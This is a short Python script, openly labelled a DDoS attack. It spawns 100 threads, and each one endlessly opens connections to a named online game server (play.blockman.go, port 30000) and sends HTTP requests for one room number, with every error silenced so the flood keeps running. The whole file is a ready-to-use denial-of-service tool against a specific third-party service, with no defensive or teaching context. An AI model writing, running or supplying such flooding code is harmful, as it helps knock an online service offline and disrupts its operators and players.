import socket
import threading
import time

# Configuration
TARGET_IP = "play.blockman.go"  # Replace with the actual IP if needed
TARGET_PORT = 30000  # Replace with the actual port if needed
ROOM_NUMBER = "102579"  # Replace with the actual room number
NUM_THREADS = 100  # Number of threads to use for the DDoS attack
MESSAGE = f"GET /room/{ROOM_NUMBER} HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n"

def ddos():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(MESSAGE.encode('utf-8'))
            s.close()
        except:
            pass

# Create and start threads
threads = []
for _ in range(NUM_THREADS):
    t = threading.Thread(target=ddos)
    t.start()
    threads.append(t)

# Keep the main thread alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("DDoS attack stopped.")